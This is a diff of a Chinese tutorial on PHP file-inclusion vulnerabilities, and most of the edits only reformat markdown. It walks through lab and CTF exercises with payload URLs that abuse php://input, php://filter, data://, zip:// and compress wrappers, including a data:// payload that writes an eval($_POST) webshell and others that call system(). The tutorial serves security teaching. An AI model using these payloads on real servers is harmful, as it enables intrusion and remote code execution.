+(2)则可以通过访问: http: //Www.xxx.com/index.php?page=http: //www.yyy.com/test.txt
 
 则会在服务器根目录下生产一个shell.php
 
@@ -804,7 +774,7 @@ include $a;
 
 ?file=http://127.0.0.1/path/xss.php?xss=phpcode
 
-\(需要allow\_url\_fopen=On，allow\_url\_include=On并且防火墙或者白名单不允许访问外网时，先在同站点找一个XSS漏洞，包含这个页面，就可以注入恶意代码了。条件非常极端和特殊- -\)
+(需要allow\_url\_fopen=On，allow\_url\_include=On并且防火墙或者白名单不允许访问外网时，先在同站点找一个XSS漏洞，包含这个页面，就可以注入恶意代码了。条件非常极端和特殊- -)
 
 ## 11、远程文件包含绕过
 
@@ -820,31 +790,31 @@ include($_GET['filename'] . ".html");
 
 ### **11.1“?”号绕过**
 
-```text
+```
 http://www.127.0.0.1.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt?
 ```
 
-![](../../.gitbook/assets/image%20%28968%29.png)
+![](<../../.gitbook/assets/image (968).png>)
 
 
 
-### **11.2“\#”号绕过**
+### **11.2“#”号绕过**
 
-```text
+```
 http://www.127.0.0.1.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt%23
 ```
 
-![](../../.gitbook/assets/image%20%28913%29.png)
+![](<../../.gitbook/assets/image (913).png>)
 
 ### **11.3  还有哪些可以绕？**
 
 用burp跑一遍发现空格也可以绕过：
 
-![](../../.gitbook/assets/image%20%28929%29.png)
+![](<../../.gitbook/assets/image (929).png>)
 
 %20
 
-![](../../.gitbook/assets/image%20%28957%29.png)
+![](<../../.gitbook/assets/image (957).png>)
 
 ## 12、**文件包含漏洞的利用方式-伪协议**
 
@@ -854,22 +824,22 @@ PHP里面为了读取PHP请求的参数或读取一些数据流/压缩包，通�
 
 通过PHP伪协议可以通过文件读取/数据流的读取/压缩包的读取，根据这样操作利用到文件包含漏洞里面
 
-Php带有很多内置的url风格的封装协议，这类协议与fopen\(\),copy\(\),file\_exists\(\),filesize\(\)等文件系统函数所提供的功能类似，常见协议如下表：
+Php带有很多内置的url风格的封装协议，这类协议与fopen(),copy(),file\_exists(),filesize()等文件系统函数所提供的功能类似，常见协议如下表：
 
-| 协议 | 功能 |
-| :--- | :--- |
-| file:// | 访问本地文件系统 |
-| http:// | 访问 HTTP\(S\) 网址 |
-| ftp:// | 访问 FTP\(S\) URL |
-| php:// | 访问各个输入/输出流（I/O streams） |
-| zlib:// | 压缩流 |
-| data:// | 数据（RFC 2397） |
-| glob:// | 查找匹配的文件路径模式 |
-| phar:// | PHP 归档 |
-| ssh2:// | Secure Shell 2 |
-| rar:// | RAR |
-| ogg:// | 音频流 |
-| expect:// | 处理交互式的流 |
+| 协议        | 功能                      |
+| --------- | ----------------------- |
+| file://   | 访问本地文件系统                |
+| http://   | 访问 HTTP(S) 网址           |
+| ftp://    | 访问 FTP(S) URL           |
+| php://    | 访问各个输入/输出流（I/O streams） |
+| zlib://   | 压缩流                     |
+| data://   | 数据（RFC 2397）            |
+| glob://   | 查找匹配的文件路径模式             |
+| phar://   | PHP 归档                  |
+| ssh2://   | Secure Shell 2          |
+| rar://    | RAR                     |
+| ogg://    | 音频流                     |
+| expect:// | 处理交互式的流                 |
 
 _php各种伪协议参考:_[_http://php.net/manual/zh/wrappers.php.php_](http://php.net/manual/zh/wrappers.php.php)
 
@@ -877,7 +847,7 @@ _php各种伪协议参考:_[_http://php.net/manual/zh/wrappers.php.php_](http://
 
 **1.文件包含漏洞小节**
 
-[https://www.cnblogs.com/iamstudy/articles/include\_file.html](https://www.cnblogs.com/iamstudy/articles/include_file.html)
+[https://www.cnblogs.com/iamstudy/articles/include\_file.html](https://www.cnblogs.com/iamstudy/articles/include\_file.html)
 
 **2.论PHP常见的漏洞**
 
@@ -885,7 +855,7 @@ _php各种伪协议参考:_[_http://php.net/manual/zh/wrappers.php.php_](http://
 
 **3.php伪协议**
 
-[http://blog.csdn.net/Ni9htMar3/article/details/69812306?locationNum=2&fps=1](http://blog.csdn.net/Ni9htMar3/article/details/69812306?locationNum=2&fps=1)
+[http://blog.csdn.net/Ni9htMar3/article/details/69812306?locationNum=2\&fps=1](http://blog.csdn.net/Ni9htMar3/article/details/69812306?locationNum=2\&fps=1)
 
 **4.包含日志文件getshell**
 
@@ -893,112 +863,27 @@ _php各种伪协议参考:_[_http://php.net/manual/zh/wrappers.php.php_](http://
 
 **伪协议说明**
 
-<table>
-  <thead>
-    <tr>
-      <th style="text-align:left">&#x534F;&#x8BAE;</th>
-      <th style="text-align:left">&#x6D4B;&#x8BD5;PHP&#x7248;&#x672C;</th>
-      <th style="text-align:left">allow_url_fpen</th>
-      <th style="text-align:left">allow_url_include</th>
-      <th style="text-align:left">&#x7528;&#x6CD5;</th>
-      <th style="text-align:left">&#x8BF4;&#x660E;</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td style="text-align:left">file://</td>
-      <td style="text-align:left">&gt;=5.2</td>
-      <td style="text-align:left">off/on</td>
-      <td style="text-align:left">off/on</td>
-      <td style="text-align:left">?file=file://D:/soft/phpstudy/WWW/phpcode.txt</td>
-      <td style="text-align:left">&#x8BFB;&#x53D6;&#x7535;&#x8111;&#x6216;&#x8005;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8DEF;&#x5F84;&#x67D0;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x800C;&#x4E14;&#x628A;&#x5185;&#x8BFB;&#x53D6;&#x51FA;&#x6765;</td>
-    </tr>
-    <tr>
-      <td style="text-align:left">php://filter</td>
-      <td style="text-align:left">&gt;=5.2</td>
-      <td style="text-align:left">off/on</td>
-      <td style="text-align:left">off/on</td>
-      <td style="text-align:left">?file=php://filter/read=convert.base64-encode/resource=./index.php</td>
-      <td
-      style="text-align:left">&#x53EF;&#x4EE5;&#x901A;&#x8FC7;filter&#x534F;&#x8BAE;&#x8BFB;&#x6587;&#x4EF6;&#xFF0C;&#x8BFB;&#x51FA;&#x6765;&#x7684;&#x6587;&#x4EF6;&#x80FD;&#x8FDB;&#x884C;&#x7F16;&#x7801;</td>
-    </tr>
-    <tr>
-      <td style="text-align:left">php://input</td>
-      <td style="text-align:left">&gt;=5.2</td>
-      <td style="text-align:left">on</td>
-      <td style="text-align:left">on</td>
-      <td style="text-align:left">?file=php://input POST DATA]&lt;?php phpinfo0?&gt;</td>
-      <td style="text-align:left">&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x8BF7;&#x6C42;&#x539F;&#x59CB;&#x6570;&#x636E;&#x7684;&#x53EA;&#x8BFB;&#x6D41;&#xFF0C;&#x5C06;POST&#x7684;&#x6570;&#x636E;&#x5F53;&#x505A;PHP&#x4EE3;&#x7801;&#x6765;&#x6267;&#x884C;</td>
-    </tr>
-    <tr>
-      <td style="text-align:left">zip://</td>
-      <td style="text-align:left">&gt;=5.2</td>
-      <td style="text-align:left">off/on</td>
-      <td style="text-align:left">off/on</td>
-      <td style="text-align:left">file=zip://D:/soft/phpStudy/WWW/file.zip%23phpcode.bxt</td>
-      <td style="text-align:left">&#x8DDF;fille&#x5DEE;&#x4E0D;&#x591A;&#xFF0C;&#x533A;&#x522B;&#x5728;&#x4E8E;zip&#x662F;&#x538B;&#x7F29;&#x5305;
-        %23&#x662F;&#x7F16;&#x7801;&#x662F;# &#x5C31;&#x662F;&#x538B;&#x7F29;&#x5305;&#x91CC;&#x9762;&#x6709;&#x4E00;&#x4E2A;txt&#x6587;&#x4EF6;</td>
-    </tr>
-    <tr>
-      <td style="text-align:left">compress.bzip2://</td>
-      <td style="text-align:left">&gt;=5.2</td>
-      <td style="text-align:left">off/on</td>
-      <td style="text-align:left">off/on</td>
-      <td style="text-align:left">?file=compress.bzip2://D:/soft/phpStudy/WWW/file.gz&#x3010;or&#x3011;?file=compress.zlib2://./file.bz2</td>
-      <td
-      style="text-align:left"></td>
-    </tr>
-    <tr>
-      <td style="text-align:left">compress.zipb://</td>
-      <td style="text-align:left">&gt;=5.2</td>
-      <td style="text-align:left">off/on</td>
-      <td style="text-align:left">off/on</td>
-      <td style="text-align:left">
-        <p>?file=compress.zlib://D:/soft/phpStudy/WWW/file.gz</p>
-        <p>&#x3010;or&#x3011;?file=compress.zlib://./file.gz</p>
-      </td>
-      <td style="text-align:left"></td>
-    </tr>
-    <tr>
-      <td style="text-align:left">data://</td>
-      <td style="text-align:left">&gt;=5.2</td>
-      <td style="text-align:left">on</td>
-      <td style="text-align:left">on</td>
-      <td style="text-align:left">
-        <p>?file=<a href="data://text/plain">data://text/plain</a>,&lt;?php phpinfo()?&gt;</p>
-        <p>&#x3010;or&#x3011;</p>
-        <p>?file=<a href="data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=">data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</a>&#x4E5F;&#x53EF;&#x4EE5;&#xFF1A;</p>
-        <p>?file=data:text/plain,&lt;?php phpinfo()?&gt;</p>
-        <p>&#x3010;or&#x3011;</p>
-        <p>?file=data:text/plain:base64.PD9waHAgcGhwaW5mbyqpPz4=</p>
-      </td>
-      <td style="text-align:left">
-        <p>&#x7C7B;&#x4F3C;input &#x8BA9;&#x7528;&#x6237;&#x6765;&#x63A7;&#x5236;&#x8F93;&#x5165;&#x6D41;</p>
-        <p>base64&#x7F16;&#x7801;&#x7684;phpinfo</p>
-        <p>PD9waHAgcGhwaW5mbyqpPz4=</p>
-      </td>
-    </tr>
-    <tr>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-    </tr>
-  </tbody>
-</table>
+| 协议                | 测试PHP版本 | allow\_url\_fpen | allow\_url\_include | 用法                                                                                                                                                                                                                                                                                                                                                           | 说明                                                                              |
+| ----------------- | ------- | ---------------- | ------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------- |
+| file://           | >=5.2   | off/on           | off/on              | ?file=file://D:/soft/phpstudy/WWW/phpcode.txt                                                                                                                                                                                                                                                                                                                | 读取电脑或者服务器的路径某一个文件，而且把内读取出来                                                      |
+| php://filter      | >=5.2   | off/on           | off/on              | ?file=php://filter/read=convert.base64-encode/resource=./index.php                                                                                                                                                                                                                                                                                           | 可以通过filter协议读文件，读出来的文件能进行编码                                                     |
+| php://input       | >=5.2   | on               | on                  | ?file=php://input POST DATA]\<?php phpinfo0?>                                                                                                                                                                                                                                                                                                                | 可以访问请求原始数据的只读流，将POST的数据当做PHP代码来执行                                               |
+| zip://            | >=5.2   | off/on           | off/on              | file=zip://D:/soft/phpStudy/WWW/file.zip%23phpcode.bxt                                                                                                                                                                                                                                                                                                       | 跟fille差不多，区别在于zip是压缩包 %23是编码是# 就是压缩包里面有一个txt文件                                  |
+| compress.bzip2:// | >=5.2   | off/on           | off/on              | ?file=compress.bzip2://D:/soft/phpStudy/WWW/file.gz【or】?file=compress.zlib2://./file.bz2                                                                                                                                                                                                                                                                     |                                                                                 |
+| compress.zipb://  | >=5.2   | off/on           | off/on              | <p>?file=compress.zlib://D:/soft/phpStudy/WWW/file.gz</p><p>【or】?file=compress.zlib://./file.gz</p>                                                                                                                                                                                                                                                          |                                                                                 |
+| data://           | >=5.2   | on               | on                  | <p>?file=<a href="data://text/plain">data://text/plain</a>,&#x3C;?php phpinfo()?></p><p>【or】</p><p>?file=<a href="data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=">data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</a>也可以：</p><p>?file=data:text/plain,&#x3C;?php phpinfo()?></p><p>【or】</p><p>?file=data:text/plain:base64.PD9waHAgcGhwaW5mbyqpPz4=</p> | <p>类似input  让用户来控制输入流</p><p>base64编码的phpinfo</p><p>PD9waHAgcGhwaW5mbyqpPz4=</p> |
+|                   |         |                  |                     |                                                                                                                                                                                                                                                                                                                                                              |                                                                                 |
 
-| 包装器或协议 | 可控功能 | allow\_url\_include | 漏洞类型 | 备注 |
-| :--- | :--- | :--- | :--- | :--- |
-| file:// | - | Off | LFI /文件处理 |  |
-| glob:// | - | Off | 目录遍历 |  |
-| php://filter/read | include | Off | 档来披露 | php://filter/read=convert.base64-encode/resource=index.php |
-| php://filter/write | file\_put\_contents | Off | 编码方式 | file\_put\_contents\("php://filter/write=string.rot13/resource=x.txt","content"\); |
-| php://input | include | On | RCE | Encoding is required while reading .php source: &lt;?php echo base64\_encode\(file\_get\_contents\("solution.php"\)\);?&gt; OR just use &lt;?php system\('cat x.php'\);?&gt; |
-| data:// | include | On | RCE | data:text/plain,&lt;?php system\("id"\)?&gt; OR data:text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpPz4= |
-| zip:// | include + uploaded file | Off | RCE |  |
-| phar:// | include + uploaded file | Off | RCE | PHP version &gt;= 5.3 |
+| 包装器或协议             | 可控功能                    | allow\_url\_include | 漏洞类型      | 备注                                                                                                                                                           |
+| ------------------ | ----------------------- | ------------------- | --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| file://            | -                       | Off                 | LFI /文件处理 |                                                                                                                                                              |
+| glob://            | -                       | Off                 | 目录遍历      |                                                                                                                                                              |
+| php://filter/read  | include                 | Off                 | 档来披露      | php://filter/read=convert.base64-encode/resource=index.php                                                                                                   |
+| php://filter/write | file\_put\_contents     | Off                 | 编码方式      | file\_put\_contents("php://filter/write=string.rot13/resource=x.txt","content");                                                                             |
+| php://input        | include                 | On                  | RCE       | Encoding is required while reading .php source: \<?php echo base64\_encode(file\_get\_contents("solution.php"));?> OR just use \<?php system('cat x.php');?> |
+| data://            | include                 | On                  | RCE       | data:text/plain,\<?php system("id")?> OR data:text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpPz4=                                                                 |
+| zip://             | include + uploaded file | Off                 | RCE       |                                                                                                                                                              |
+| phar://            | include + uploaded file | Off                 | RCE       | PHP version >= 5.3                                                                                                                                           |
 
 来源[https://www.cdxy.me/?p=752](https://www.cdxy.me/?p=752)
 
@@ -1012,7 +897,7 @@ allow_url_include：off/on
 ```
 
 * file:// 用于访问本地文件
-* file:// \[文件的绝对路径和文件名\]
+* file:// \[文件的绝对路径和文件名]
 
 **测试代码：**
 
@@ -1022,34 +907,34 @@ allow_url_include：off/on
 ?>
 ```
 
- · http://127.0.0.1/1.php?x=file://D://phpinfo.txt    
+&#x20;· http://127.0.0.1/1.php?x=file://D://phpinfo.txt   &#x20;
 
-![](../../.gitbook/assets/image%20%28923%29.png)
+![](<../../.gitbook/assets/image (923).png>)
 
 ### 12.3 php://协议 输入/输出流（I/O streams）
 
-**php://filter**_：用于读取源码并进行bash64编码输出；_    
+**php://filter**_：用于读取源码并进行bash64编码输出；_   &#x20;
 
 在双off的情况下也可以正常使用；
 
 条件：
 
-* allow\_url\_fope   off/on        
+* allow\_url\_fope   off/on       &#x20;
 * allow\_url\_include on
 
-不需要开启allow\_url\_fopen  
+不需要开启allow\_url\_fopen\
 
 
-**php：//input**_：可以访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行；_    
+**php：//input**_：可以访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行；_   &#x20;
 
-条件\(php.ini\)：        
+条件(php.ini)：       &#x20;
 
-* allow\_url\_fope   off/on        
-* allow\_url\_include on    
+* allow\_url\_fope   off/on       &#x20;
+* allow\_url\_include on   &#x20;
 
 仅php://input、 php://stdin、 php://memory 和 php://temp 需要开启 allow\_url\_include。
 
-php://stdin是只读的，php://stdout 和 php://stderr 是只写的。     php://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。    
+php://stdin是只读的，php://stdout 和 php://stderr 是只写的。     php://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。   &#x20;
 
 php://fd 允许直接访问指定的文件描述符。
 
@@ -1066,12 +951,12 @@ php://input可以访问请求的原始数据的只读流，将post请求的数�
 
 注：enctype="multipart/form-data" 的时候 php://input 是无效的。
 
-注：遇到file\_get\_contents\(\)要想到用php://input绕过。
+注：遇到file\_get\_contents()要想到用php://input绕过。
 
-**条件：**    
+**条件：**   &#x20;
 
-* php &lt;5.0 ，allow\_url\_include=Off/On 情况下也可以用    
-* php &gt; 5.0，只有在allow\_url\_fopen=On 时才能使用
+* php <5.0 ，allow\_url\_include=Off/On 情况下也可以用   &#x20;
+* php > 5.0，只有在allow\_url\_fopen=On 时才能使用
 
 **测试代码：**
 
@@ -1096,13 +981,13 @@ if($file){
 
 它会读取POST的内容进行执行因为把php代码include到里面了php代码就会执行
 
-```text
+```
 http://127.0.0.1/ctf/2/php_input.php?file=php://input<?php phpinfo(); ?>
 ```
 
 这样就可以获取phpinfo页面说明代码成功执行了 我们要获取flag
 
-![](../../.gitbook/assets/image%20%28901%29.png)
+![](<../../.gitbook/assets/image (901).png>)
 
 
 
@@ -1112,7 +997,7 @@ http://127.0.0.1/ctf/2/php_input.php?file=php://input<?php phpinfo(); ?>
 <?php system("dir"); ?>
 ```
 
-![](../../.gitbook/assets/image%20%28925%29.png)
+![](<../../.gitbook/assets/image (925).png>)
 
 
 
@@ -1129,7 +1014,7 @@ http://127.0.0.1/ctf/2/php_input.php?file=php://input<?php phpinfo(); ?>
 //如果一句话木马内容为双引号那么不会成功执行
 ```
 
-![](../../.gitbook/assets/image%20%28937%29.png)
+![](<../../.gitbook/assets/image (937).png>)
 
 
 
@@ -1137,22 +1022,22 @@ http://127.0.0.1/ctf/2/php_input.php?file=php://input<?php phpinfo(); ?>
 
 ### 12.5 php\_filter （本地磁盘文件进行读取）重点理解
 
-php://filter：\(读取文件\)
+php://filter：(读取文件)
 
-php://filter 是一种元封装器， 设计用于数据流打开时的[筛选过滤](https://www.php.net/manual/zh/filters.php)应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 [readfile\(\)](https://www.php.net/manual/zh/function.readfile.php)、 [file\(\)](https://www.php.net/manual/zh/function.file.php) 和 [file\_get\_contents\(\)](https://www.php.net/manual/zh/function.file-get-contents.php)， 在数据流内容读取之前没有机会应用其他过滤器。 可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。
+php://filter 是一种元封装器， 设计用于数据流打开时的[筛选过滤](https://www.php.net/manual/zh/filters.php)应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 [readfile()](https://www.php.net/manual/zh/function.readfile.php)、 [file()](https://www.php.net/manual/zh/function.file.php) 和 [file\_get\_contents()](https://www.php.net/manual/zh/function.file-get-contents.php)， 在数据流内容读取之前没有机会应用其他过滤器。 可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。
 
 php://filter **参数**
 
-| **名称** | **描述** | **说明** |
-| :--- | :--- | :--- |
-| resource=&lt;要过滤的数据流&gt; | 这个参数是必须的。它指定了你要筛选过滤的数据流。 | 理解为文件名字 |
-| read=&lt;读链的筛选列表&gt; | 该参数可选。可以设定一个或多个过滤器名称，以管道符（\|）分隔。 | \|可以加或不加，如果加可以Base64进行编码 |
-| write=&lt;写链的筛选列表&gt; | 该参数可选。可以设定一个或多个过滤器名称，以管道符（\|）分隔。 |  |
-| &lt;；两个链的筛选列表&gt; | 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 |  |
+| **名称**             | **描述**                                      | **说明**                   |
+| ------------------ | ------------------------------------------- | ------------------------ |
+| resource=<要过滤的数据流> | 这个参数是必须的。它指定了你要筛选过滤的数据流。                    | 理解为文件名字                  |
+| read=<读链的筛选列表>     | 该参数可选。可以设定一个或多个过滤器名称，以管道符（\|）分隔。            | \|可以加或不加，如果加可以Base64进行编码 |
+| write=<写链的筛选列表>    | 该参数可选。可以设定一个或多个过滤器名称，以管道符（\|）分隔。            |                          |
+| <；两个链的筛选列表>        | 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 |                          |
 
 **语法**
 
-* **Example \#2** php://filter/resource=**&lt;待过滤的数据流&gt;**
+* **Example #2** php://filter/resource=**<待过滤的数据流>**
 
 这个参数必须位于 php://filter 的末尾，并且指向需要过滤筛选的数据流。
 
@@ -1167,9 +1052,9 @@ readfile("php://filter/resource=http://www.example.com");    //readfile文件读
 ?>
 ```
 
-* **Example \#3** php://filter/read=**&lt;读链需要应用的过滤器列表&gt;**
+* **Example #3** php://filter/read=**<读链需要应用的过滤器列表>**
 
-这个参数采用一个或以管道符 \| 分隔的多个过滤器名称。
+这个参数采用一个或以管道符 | 分隔的多个过滤器名称。
 
 ```php
 <?php
@@ -1183,9 +1068,9 @@ readfile("php://filter/read=string.toupper|string.rot13/resource=http://www.exam
 ?>
 ```
 
-* **Example \#4** php://filter/write=**&lt;写链需要应用的过滤器列表&gt;**
+* **Example #4** php://filter/write=**<写链需要应用的过滤器列表>**
 
-这个参数采用一个或以管道符 \| 分隔的多个过滤器名称。
+这个参数采用一个或以管道符 | 分隔的多个过滤器名称。
 
 ```php
 <?php
@@ -1243,21 +1128,21 @@ file_put_contents("php://filter/write=string.rot13/resource=example.txt","Hello 
 test5</html>
 ```
 
-* 打开地址 点击一下  [click me? no](http://127.0.0.1/1/index.php?file=show.php)  
+* 打开地址 点击一下  [click me? no](http://127.0.0.1/1/index.php?file=show.php) &#x20;
 
-![](../../.gitbook/assets/image%20%28900%29.png)
+![](<../../.gitbook/assets/image (900).png>)
 
 直接跳到 http://127.0.0.1/1/index.php?file=show.php 从URL得到出file传参包含得到show.php
 
-![](../../.gitbook/assets/image%20%28931%29.png)
+![](<../../.gitbook/assets/image (931).png>)
 
 * 使用伪协议php://filter base64编码进行包含index.php
 
-```text
+```
 http://127.0.0.1/1/index.php?file=php://filter/read=convert.base64-encode/resource=index.php
 ```
 
-![](../../.gitbook/assets/image%20%28939%29.png)
+![](<../../.gitbook/assets/image (939).png>)
 
 * 得到base64编码
 
@@ -1279,23 +1164,24 @@ file_put_contents($code,"test");
 ?> 
 ```
 
-·  http://127.0.0.1/5.php?a=php://output   
+·  http://127.0.0.1/5.php?a=php://output  &#x20;
 
-![](../../.gitbook/assets/image%20%28955%29.png)
+![](<../../.gitbook/assets/image (955).png>)
 
 
 
 ### 12.7 zip://, bzip2://, zlib://协议 
 
-zip://, bzip2://, zlib://协议条件：    
+zip://, bzip2://, zlib://协议条件：   &#x20;
 
-* allow\_url\_fope   off/on    
+* allow\_url\_fope   off/on   &#x20;
 * allow\_url\_include off/on
-* * bzip2:_//使用方法：_    
-* bzip2:_//file.bz2_zlib:_//使用方法：_    
+*
+* bzip2:_//使用方法：_   &#x20;
+* bzip2:_//file.bz2_zlib:_//使用方法：_   &#x20;
 * zlib:_//file.gz_
 
-```text
+```
 3个封装协议，都是直接打开压缩文件。
 compress.zlib://file.gz - 处理的是 '.gz' 后缀的压缩包
 compress.bzip2://file.bz2 - 处理的是 '.bz2' 后缀的压缩包
@@ -1307,7 +1193,7 @@ zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子
 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。
 
 * zip://中只能传入绝对路径。
-* 要用\#分隔压缩包和压缩包里的内容，并且\#要用url编码%23（即下述POC中\#要用%23替换）
+* 要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）
 * 只需要是zip的压缩包即可，后缀名可以任意更改。
 * 相同的类型的还有zlib://和bzip2://
 
@@ -1315,14 +1201,14 @@ zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子
 
 php 版本大于等于 php5.3.0
 
-* zip:_//使用方法：_    
-* zip:_//\[压缩文件绝对路径\]\#\[压缩文件内的子文件名\]_
+* zip:_//使用方法：_   &#x20;
+* zip:_//\[压缩文件绝对路径]#\[压缩文件内的子文件名]_
 
-要用绝对路径+url编码\#
+要用绝对路径+url编码#
 
 * 创建一个uploads文件夹
 
-![](../../.gitbook/assets/image%20%28917%29.png)
+![](<../../.gitbook/assets/image (917).png>)
 
 
 
@@ -1380,40 +1266,40 @@ if( isset( $_FILES['fupload'] ) ) {
 
 * 点击upload？直接跳转
 
-![](../../.gitbook/assets/image%20%28973%29.png)
+![](<../../.gitbook/assets/image (973).png>)
 
 * 跳转到文件上传功能上 题目思路上传文件再利用压缩包协议进行包含获取webshell
 
 从上传分析只能上传jpg，png，zip.....
 
-![](../../.gitbook/assets/image%20%28941%29.png)
+![](<../../.gitbook/assets/image (941).png>)
 
 * 上传一个压缩包里面包含php的文件 并且得到了绝对路径
-* 利用zip协议进行包含并且加上%23和压缩包里面文件（如果不用%23而用\#后面的文件是被忽略）
+* 利用zip协议进行包含并且加上%23和压缩包里面文件（如果不用%23而用#后面的文件是被忽略）
 
-```text
+```
 ?file=zip://D:\phpstudy_pro\WWW\CTF\3\uploads\8a10fd88e3ab15c68d1596b0b4377816.zip%23test.php
 ```
 
-![](../../.gitbook/assets/image%20%28954%29.png)
+![](<../../.gitbook/assets/image (954).png>)
 
 访问失败 因为在代码中是拼接了一个php
 
-![](../../.gitbook/assets/image%20%28974%29.png)
+![](<../../.gitbook/assets/image (974).png>)
 
 在访问的时候去掉“ .php ”就可以了
 
-![](../../.gitbook/assets/image%20%28946%29.png)
+![](<../../.gitbook/assets/image (946).png>)
 
 如果把压缩包改成“jpg”是否还可以通过zip协议识别包含
 
-![](../../.gitbook/assets/image%20%28919%29.png)
+![](<../../.gitbook/assets/image (919).png>)
 
-```text
+```
 http://127.0.0.1/ctf/3/php_zip.php?file=zip://D:\phpstudy_pro\WWW\CTF\3\uploads\8a10fd88e3ab15c68d1596b0b4377816.jpg#test
 ```
 
-![](../../.gitbook/assets/image%20%28956%29.png)
+![](<../../.gitbook/assets/image (956).png>)
 
 说明zip协议不会校验后台的名称，不管是jpg还是png等等都会当成zip文件
 
@@ -1433,9 +1319,9 @@ pyload:[`http://127.0.0.1/xxx.php?a=compress.bzip2://C:/Users/liuxianglai/Deskto
 
 或者文件改为jpg后缀
 
-``` http://127.0.0.1/xxx.php?a=compress.bzip2://C:/Users/liuxianglai/Desktop/test.jpg``
+`` ` http://127.0.0.1/xxx.php?a=compress.bzip2://C:/Users/liuxianglai/Desktop/test.jpg ``
 
-![](../../.gitbook/assets/image%20%28910%29.png)
+![](<../../.gitbook/assets/image (910).png>)
 
 **zlib://协议**
 
@@ -1445,9 +1331,9 @@ pyload:[`http://127.0.0.1/xxx.php?a=compress.bzip2://C:/Users/liuxianglai/Deskto
 
 相对路径也可以
 
-``` http://127.0.0.1/xxx.php?a=compress.zlib://file.gz`` 
+`` ` http://127.0.0.1/xxx.php?a=compress.zlib://file.gz ``&#x20;
 
-![](../../.gitbook/assets/image%20%28922%29.png)
+![](<../../.gitbook/assets/image (922).png>)
 
 
 
@@ -1456,7 +1342,7 @@ pyload:[`http://127.0.0.1/xxx.php?a=compress.bzip2://C:/Users/liuxianglai/Deskto
 <?php phpinfo(); ?>
 ```
 
-![](../../.gitbook/assets/image%20%28947%29.png)
+![](<../../.gitbook/assets/image (947).png>)
 
 **扩展**
 
@@ -1481,21 +1367,21 @@ if (!$file) echo '<a href="?file=upload">upload?</a>';
 
 phar://中相对路径和绝对路径都可以使用
 
-![](../../.gitbook/assets/image%20%28930%29.png)
+![](<../../.gitbook/assets/image (930).png>)
 
 ### 12.8 php-date
 
-条件：    
+条件：   &#x20;
 
 allow\_url\_fope = on    allow\_url\_include = on
 
 data://：将原本的include的文件流重定向到了用户可控制的输入流中
 
-条件：     allow\_url\_include=On     php &gt; 5.2  
+条件：     allow\_url\_include=On     php > 5.2\
 
 
-**测试代码：**  
-
+**测试代码：**\
+****
 
 ```php
 //include.php 
@@ -1507,51 +1393,51 @@ data://：将原本的include的文件流重定向到了用户可控制的输入
 
 **通过data://text/plain协议包含phpinfo**
 
-```text
+```
 ?file=data://text/plain,<?php phpinfo();?>
 ```
 
-![](../../.gitbook/assets/image%20%28969%29.png)
+![](<../../.gitbook/assets/image (969).png>)
 
 
 
 **通过data://text/plain协议包含Base64编码phpinfo**
 
-```text
+```
 ?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
 ```
 
-![](../../.gitbook/assets/image%20%28920%29.png)
+![](<../../.gitbook/assets/image (920).png>)
 
 
 
 **通过data:text/plain协议包含phpinfo（省掉“//”）**
 
-```text
+```
 ?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
 ```
 
-![](../../.gitbook/assets/image%20%28934%29.png)
+![](<../../.gitbook/assets/image (934).png>)
 
 
 
-**通过data://text/plain协议包含Base64编码&lt;?php system\("dir"\);?&gt;**
+**通过data://text/plain协议包含Base64编码\<?php system("dir");?>**
 
-```text
+```
 ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJkaXIiKTs/Pg==
 ```
 
-![](../../.gitbook/assets/image%20%28935%29.png)
+![](<../../.gitbook/assets/image (935).png>)
 
 
 
 **通过data://text/plain协议包含利用一句话木马**
 
-```text
+```
 ?file=data://text/plain,<?php fputs(fopen("shell.php","w"),'<?php eval($_POST[cmd]);?>');?>
 ```
 
-![](../../.gitbook/assets/image%20%28916%29.png)
+![](<../../.gitbook/assets/image (916).png>)
 
 ## 13、
 
@@ -1575,11 +1461,11 @@ if(isset($_GET['x']))
 
 接着利用网站的上传功能上传文件
 
-![](../../.gitbook/assets/image%20%28950%29.png)
+![](<../../.gitbook/assets/image (950).png>)
 
-攻击payload:  \`  http://atest.test/2.php?x=zip://111.zip%231 ``
+攻击payload:  \`  http://atest.test/2.php?x=zip://111.zip%231 ``&#x20;
 
